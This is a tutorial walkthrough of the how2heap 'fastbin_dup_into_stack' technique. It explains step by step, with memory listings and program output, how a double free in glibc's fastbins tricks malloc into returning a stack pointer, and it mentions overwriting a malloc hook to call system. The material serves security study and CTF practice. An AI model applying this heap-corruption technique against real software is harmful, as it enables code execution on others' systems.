# Shellphish how2heap fastbin_dup_into_stack

For a challenge related to this section: https://github.com/guyinatuxedo/ctf/tree/master/0ctf/pwn/babyheap

This is another section off of the Shellphish how2heap gitbhub repo, which well documents itself in addition to providing the source code for these sections. 

This time we will be using a double free to have malloc return a pointer outside of the heap and to the stack.

First we allocate three fastbins, and see the stack address we want to return:
```
1:	8 bytes:	0x556a7e74c010
2:	8 bytes:	0x556a7e74c030
3:	8 bytes:	0x556a7e74c050
stack address:	0x7fff32ecd2d8
```

First we free chunk 1 `0x556a7e74c010`. This will add it to the free list. 
```
1:	8 bytes:	0x556a7e74c010 (freed)
2:	8 bytes:	0x556a7e74c030
3:	8 bytes:	0x556a7e74c050
stack address:	0x7fff32ecd2d8
```

Next we will to free `0x556a7e74c010` again, however before we do that we will need to free another chunk because if we free a ptr that is at the top of the free list (which `0x556a7e74c010` is) the program will crash:

```
1:	8 bytes:	0x556a7e74c010 (freed)
2:	8 bytes:	0x556a7e74c030 (freed)
3:	8 bytes:	0x556a7e74c050
stack address:	0x7fff32ecd2d8
```

Now that `0x556a7e74c010` is no longer at the top of the free list, we can go ahead and free it again:
```
1:	8 bytes:	0x556a7e74c010 (freed twice)
2:	8 bytes:	0x556a7e74c030 (freed)
3:	8 bytes:	0x556a7e74c050
stack address:	0x7fff32ecd2d8
```

So now the free list has `0x556a7e74c010`, `0x556a7e74c030`, and `0x556a7e74c010` (in that order). We can allocate two additional chunks of memory (eight bytes each), which will allow us to edit `0x556a7e74c010` while it is at the top of the free list:
```
1:	8 bytes:	0x556a7e74c010 (freed twice)
2:	8 bytes:	0x556a7e74c030 (freed)
3:	8 bytes:	0x556a7e74c050
4:	8 bytes:	0x556a7e74c010 (points to where malloc 1 was)
5:	8 bytes:	0x556a7e74c030 (points to where malloc 2 was)
stack address:	0x7fff32ecd2d8
```

Now that we have `0x556a7e74c010` allocated while it is also at the top of the free list, we can make the fake chunk. In order to do this, we will need `0x556a7e74c010` to start with the stack address we want to write to `0x7fff32ecd2d8 - 0x10 = 0x7fff32ecd2c8`. The reason for the `-0x10` is that we need to make that much space for heap metadata, which we can't write to without exploiting a bug (so using the pointer it returns we will be able to start writing to `0x7fff32ecd2d8` right off of the bat):

```
1:	8 bytes:	0x556a7e74c010 (freed twice)
2:	8 bytes:	0x556a7e74c030 (freed)
3:	8 bytes:	0x556a7e74c050
4:	8 bytes:	0x556a7e74c010 (points to where malloc 1 was) : contains 0x7fff32ecd2c8 
5:	8 bytes:	0x556a7e74c030 (points to where malloc 2 was)
stack address:	0x7fff32ecd2d8
```

Now that `0x556a7e74c010` points to `0x7fff32ecd2d8`, we are almost ready to make the fake chunk. The last thing that we will do is set `0x7fff32ecd2d8` equal to 0x20. The reason for this being is this will act as a free size, so malloc will think it is a free chunk and add it to the list of free chunks, which we can then allocate:

```
1:	8 bytes:	0x556a7e74c010 (freed twice)
2:	8 bytes:	0x556a7e74c030 (freed)
3:	8 bytes:	0x556a7e74c050
4:	8 bytes:	0x556a7e74c010 (points to where malloc 1 was) : contains 0x7fff32ecd2c8 
5:	8 bytes:	0x556a7e74c030 (points to where malloc 2 was)
stack address:	0x7fff32ecd2d8 : contains 0x20
```

Next we can allocate `0x556a7e74c010` (since it is at the top of the free list), which will cause malloc to add `0x7fff32ecd2d8` to the free list:
```
1:	8 bytes:	0x556a7e74c010 (freed twice)
2:	8 bytes:	0x556a7e74c030 (freed)
3:	8 bytes:	0x556a7e74c050
4:	8 bytes:	0x556a7e74c010 (points to where malloc 1 was) : contains 0x7fff32ecd2c8 
5:	8 bytes:	0x556a7e74c030 (points to where malloc 2 was)
6:	8 bytes:	0x556a7e74c010 
stack address:	0x7fff32ecd2d8 : contains 0x20
```

Now that `0x7fff32ecd2d8` is in the free list, we can just allocate another 8 bytes, and cause malloc to return a prt to it:
```
1:	8 bytes:	0x556a7e74c010 (freed twice)
2:	8 bytes:	0x556a7e74c030 (freed)
3:	8 bytes:	0x556a7e74c050
4:	8 bytes:	0x556a7e74c010 (points to where malloc 1 was) : contains 0x7fff32ecd2c8 
5:	8 bytes:	0x556a7e74c030 (points to where malloc 2 was)
6:	8 bytes:	0x556a7e74c010 
7:	8 bytes:	0x7fff32ecd2d8
stack address:	0x7fff32ecd2d8 : contains 0x20
```

Just like that, we returned a pointer using malloc to an area outside of the heap. This is really useful, for the fact that it can allow us to manipulate data in lots of different places (like writing over a malloc hook to call system when you run it). Below you will find an actual instance of this elf running, which also well documents and explains everything:

```
$	./fastbin_dup_into_stack 
This file extends on fastbin_dup.c by tricking malloc into
returning a pointer to a controlled location (in this case, the stack).
The address we want malloc() to return is 0x7fff32ecd2d8.
Allocating 3 buffers.
1st malloc(8): 0x556a7e74c010
2nd malloc(8): 0x556a7e74c030
3rd malloc(8): 0x556a7e74c050
Freeing the first one...
If we free 0x556a7e74c010 again, things will crash because 0x556a7e74c010 is at the top of the free list.
So, instead, we'll free 0x556a7e74c030.
Now, we can free 0x556a7e74c010 again, since it's not the head of the free list.
Now the free list has [ 0x556a7e74c010, 0x556a7e74c030, 0x556a7e74c010 ]. We'll now carry out our attack by modifying data at 0x556a7e74c010.
1st malloc(8): 0x556a7e74c010
2nd malloc(8): 0x556a7e74c030
Now the free list has [ 0x556a7e74c010 ].
Now, we have access to 0x556a7e74c010 while it remains at the head of the free list.
so now we are writing a fake free size (in this case, 0x20) to the stack,
so that malloc will think there is a free chunk there and agree to
return a pointer to it.
Now, we overwrite the first 8 bytes of the data at 0x556a7e74c010 to point right before the 0x20.
3rd malloc(8): 0x556a7e74c010, putting the stack address on the free list
4th malloc(8): 0x7fff32ecd2d8
```
